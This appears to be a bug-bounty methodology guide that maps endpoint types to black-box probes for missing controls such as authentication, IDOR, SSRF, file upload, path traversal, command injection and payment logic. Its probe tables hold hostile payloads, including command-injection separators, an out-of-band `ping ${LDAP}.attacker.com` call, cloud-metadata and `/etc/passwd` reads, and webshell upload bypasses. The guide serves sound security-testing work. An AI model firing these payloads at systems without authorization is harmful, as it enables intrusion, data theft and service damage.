# Control-gap hunting

> White-box view: check "does this control exist in the code". Black-box view: probe "is this control actually enforced".
> This is the SOP for when a hunter gets a new feature and doesn't know where to start.

---

## 1. Mental model

**Sensitive operation = the matrix of controls it should have → black-box probe = test whether each control is missing.**

```
See an endpoint → classify it (data modification / funds / files / SSRF / auth / privilege / command / broken access / information)
         ↓
        Look up the table → which N controls this type should have
         ↓
For each control → design a probe: access it without satisfying that control, and observe the response
         ↓
        Whichever returns 200 / business success → a vulnerability
```

The nine operation classes and their probe quick-reference are in section 3.

---

## 2. Endpoint classification quick-reference

| Endpoint trait | Type |
|---------|------|
| `POST/PUT/DELETE` + a resource ID | Data modification |
| `GET` + a single ID (`/order/{id}`) | Data access |
| Contains `export`, `download`, `batch` | Bulk |
| Contains `role`, `permission`, `grant` | Privilege change |
| Contains `transfer`, `pay`, `refund`, `balance` | Funds |
| Accepts a URL parameter (`?url=`, `?fetch=`, `?import=`, a callback) | SSRF |
| `multipart/form-data` upload | File upload |
| Contains `file`, `path`, `filename`, `download` | File read / delete |
| Contains `cmd`, `exec`, `ping`, `nslookup`, `shell` | Command execution |
| `/login`, `/reset`, `/verify`, `/sms` | Authentication |

---

## 3. The 9 operation classes x probe tables

### 3.1 Data modification (CREATE / UPDATE / DELETE)

| Expected control | Black-box probe | If missing |
|---------|---------|-------|
| Authentication | Drop Authorization / Cookie, send the request | Unauthenticated write → P0 |
| Resource ownership | Use account A to modify B's resource ID | IDOR / broken access → P1 |
| Input validation | Change the type (int → "abc"), overflow the length | Error / crash → information disclosure |
| Input integrity | Add an extra field `is_admin=true` | Mass assignment → P0 |
| Operation confirmation | DELETE directly without a second-confirmation token | Accidental deletion / CSRF |

### 3.2 Data access (READ)

| Probe | If missing |
|------|-------|
| Change the ID number (incremental) / change the UUID (enumerate if unguessable) / change the hash | IDOR |
| Access after dropping authentication | Unauthorized data disclosure |
| `?ids=1,2,3,...,10000` in bulk | Large-scale disclosure |
| Change the field filter (`?fields=*` or GraphQL) | Field-level disclosure |

### 3.3 Bulk / export

| Probe | If missing |
|------|-------|
| Change the export range (`startDate=2010-01-01`) | Full disclosure |
| Drop the range limit / user filter | Cross-tenant disclosure |
| High-frequency calls / high concurrency | DoS / resource exhaustion |
| Change the export object ID (export another user's orders) | Broken-access bulk |

### 3.4 Privilege change

| Probe | If missing |
|------|-------|
| An ordinary user calls `/role/grant` | Missing authorization, privilege escalation (P0) |
| Grant yourself admin | Self-escalation (P0) |
| An ordinary admin grants super_admin | Missing boundary (P0) |
| Change hidden body fields like `role: admin` (IDOR + mass assignment) | Critical escalation (P0) |

### 3.5 Funds

| Probe | If missing |
|------|-------|
| Change the amount to 0 / 0.01 / negative / 1e-10 | Missing amount validation (P0) |
| Change the product ID but keep the low price | Server does not recompute → arbitrary payment |
| Replay the payment callback (same signature twice) | Missing idempotency → double spend |
| 50 concurrent identical requests | Race condition → overdraft / duplicate coupon issuance |
| Stack discount coupons / refund the coupon after a return | Business-logic flaw |

Reference: WooYun-2015-0108817 (e-commerce price tampering).

### 3.6 Outbound HTTP (SSRF)

| Probe | If missing |
|------|-------|
| `?url=http://127.0.0.1` / `[::1]` / `2130706433` | Missing internal-network block |
| `?url=file:///etc/passwd` | Missing protocol allowlist |
| `?url=http://169.254.169.254/...` | Cloud metadata reachable |
| `?url=http://attacker.com` to see whether it calls back | DNSLog verifies basic SSRF |
| `?url=http://attacker.com` triggering a 302 → internal | Redirect following not restricted |
| DNS rebinding (`rbndr.us`) | Second resolution escapes the allowlist |

### 3.7 File upload

| Probe | If missing |
|------|-------|
| Change the extension to `.php` `.jsp` `.asp` `.phtml` `.jspx` | Missing blocklist |
| `.Php` / `.pHp%20` / `.php.` | Case / space bypass |
| `shell.php%00.jpg` | Null-byte truncation bypass (older versions) |
| `Content-Type: image/jpeg` but the body is a script | MIME check relies on the header only |
| Add `../` to the filename | Missing path validation |
| Access the directory listing after upload | Naming-scheme guessing |
| Content with an image header + a script (image-embedded webshell) | Combined with a parsing flaw |

### 3.8 File read / download / delete

| Probe | If missing |
|------|-------|
| `?file=../../etc/passwd` at each depth | Missing path canonicalization |
| `?file=/etc/passwd` (absolute path) | Missing prefix check |
| `?file=file:///etc/passwd` | Missing protocol filtering |
| Delete endpoint: `?path=../../web/index.html` | **Arbitrary file delete (easily missed!)** |
| Case: `?file=../../ETC/PASSWD` | Blocklist only lowercases |

### 3.9 Command execution (including ping / nslookup / tool endpoints)

| Probe | If missing |
|------|-------|
| `127.0.0.1; id` / `\| id` / `&& id` / `` `id` `` / `$(id)` | Missing separator filtering |
| `127.0.0.1%0aid` | Newline bypass |
| `127.0.0.1 -c1 -W1 ; sleep 5` | Time-based blind (no echo) |
| `ping ${LDAP}.attacker.com` and watch DNSLog | Out-of-band verification |
| When cat / curl is filtered, switch to tac / wget | Keyword filtering |

### 3.10 Authentication operations

| Probe | If missing |
|------|-------|
| Brute-force the SMS code (4-6 digits, no rate limit) | Verification-code brute force |
| Code does not refresh (same code used repeatedly) | Reusable verification code |
| Code binding: use the code A's phone received to change B's password | Code decoupled from the user |
| Skip steps in the reset flow (GET the step-3 page directly) | Flow-step skipping |
| Change the body `username=victim` | Credential parameter is controllable |
| Credential stuffing (public database + no rate limit) | Credential stuffing |

See the 4 password-reset patterns in `playbooks/logic-flaws.md`.

### 3.11 Broken access control (its own class, often missed)

| Probe | If missing |
|------|-------|
| Horizontal: account A modifies B's resource (same-level) | IDOR (P1) |
| Vertical: an ordinary user calls an admin API | Backend authz only checks the JWT, not the role (P0) |
| Header-based: inject `X-User-Role: admin` | Header trust (P0) |
| Cookie-based: change `role` / `userId` in the cookie | Client-controllable session (P0) |
| Method-based: if DELETE fails, try OPTIONS / `X-HTTP-Method-Override` | Incomplete method filtering |

---

## 4. The "new feature 5-minute probe combo"

When you get a new feature, do these 5 steps first (about 5-10 minutes):

```
1. Capture 1 complete request (keep all headers / cookies / body)
   → see what "important-looking fields" it contains

2. Drop Authorization / Cookie and resend
   → see whether it still works (unauthenticated)

3. Change 1 ID field (increment the number / swap the UUID / swap the tenant)
   → see whether you can get another user's data (IDOR)

4. Change 1 field that "the client shouldn't control"
   (price / role / status / is_admin / amount / userId)
   → see whether it takes effect (mass assignment / tampering)

5. Add a corner-case field (duplicate parameter / null / long string / array)
   → see whether the response changes or errors (information disclosure / type confusion)
```

If nothing turns up after these 5 steps, go into the matching playbook to dig deeper.

---

## 5. How to write up a control gap

Present these in the report using a single table format; platform reviewers like it:

```markdown
## Control-gap analysis

| Expected control | Enforced at this endpoint? | Evidence |
|---------|----------------|------|
| Authentication | ✓ Dropping Authorization returns 401 | (request omitted) |
| Resource ownership | ✗ Account A can read B's data | See PoC §1 |
| Input integrity | ✗ Accepts the `is_admin=true` field | See PoC §2 |
| Operation auditing | ? Cannot be judged externally | - |

Conclusion: missing "resource ownership" + "mass-assignment protection",
which combined let an ordinary user escalate to admin.
```

---

## 6. Easily missed blind spots

> The "high-frequency blind spots" from analyzing WooYun + real SRC reports

1. **File deletion** — everyone tests upload / download but forgets DELETE. Arbitrary file delete can take down the service (delete `index.html`).
2. **Bulk parameters** (`ids=1,2,3,...,10000`) — when a single IDOR is restricted, the bulk endpoint often is not.
3. **Export range** (`startDate=2010-01-01`) — widen the paging / push the date back ten years.
4. **OPTIONS / HEAD** — a lot of authz interception only targets GET/POST.
5. **Secondary / internal endpoints** — capturing the mobile app / WeChat mini-program often reveals endpoints not exposed on PC.
6. **WebSocket / SSE** — easily missed if undocumented and its traffic isn't captured.
7. **GraphQL deep nesting** — permission at the top level, but not on sub-fields (see `playbooks/graphql.md`).
8. **Logout / sign-out redirect_uri** — nearly everyone forgets to allowlist the OAuth logout.
9. **Third-party callbacks** (short URL / sms / pay callbacks) — the callback endpoint is often unsigned.

Spending 5 minutes each audit going through these 9 blind spots turns up plenty of P1s.

---

## 7. Handoff to the playbooks

Found a missing control of some type → go into the matching playbook to dig deeper:

| Missing control | Matching playbook |
|---------|--------------|
| Authentication / resource ownership | `playbooks/unauth-access.md`, `playbooks/logic-flaws.md` (broken access) |
| URL allowlist / protocol filtering | `playbooks/ssrf-cache-host.md` |
| File type / path | `playbooks/file-upload.md`, `playbooks/path-traversal.md` |
| Command allowlist / concatenation | `playbooks/rce.md` |
| Verification code / credential binding | `playbooks/logic-flaws.md` |
| Input validation (SQL / XSS) | `playbooks/sqli.md`, `playbooks/xss.md` |
| Amount / idempotency / concurrency | `playbooks/logic-flaws.md`, `playbooks/race-conditions.md` |
